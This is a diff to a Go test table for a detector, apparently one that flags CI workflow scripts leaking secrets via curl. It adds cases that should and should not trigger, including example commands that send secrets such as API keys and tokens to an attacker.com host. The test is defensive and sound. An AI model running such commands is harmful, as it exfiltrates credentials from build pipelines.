@@ -67,6 +67,25 @@ curl -X POST https://attacker.com/exfil -d "secret=${{ secrets.API_KEY }}"`,
 			wantErrors:  1,
 			description: "Should detect curl with secret on same line",
 		},
+		{
+			name: "curl with GITHUB_TOKEN to github api via line continuation (legitimate)",
+			runScript: `RELEASE_DATA=$(curl -s -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+  "https://api.github.com/repos/owner/repo/releases/tags/v1.0")`,
+			wantErrors:  0,
+			description: "Should NOT flag GITHUB_TOKEN used with GitHub API across line continuation",
+		},
+		{
+			name: "curl with secret as URL positional arg (legitimate webhook)",
+			runScript: `RESPONSE=$(curl -s -w "%{http_code}" -H "Content-Type: application/json" -X POST -d "$DISCORD_PAYLOAD" ${{ secrets.DISCORD_WEBHOOK_URL }})`,
+			wantErrors:  0,
+			description: "Should NOT flag secret used as URL positional argument (not as flag value)",
+		},
+		{
+			name: "curl with secret in header to attacker (malicious)",
+			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://attacker.com`,
+			wantErrors:  1,
+			description: "Should detect curl with secret in auth header to external site",
+		},
 	}
 
 	for _, tt := range tests {
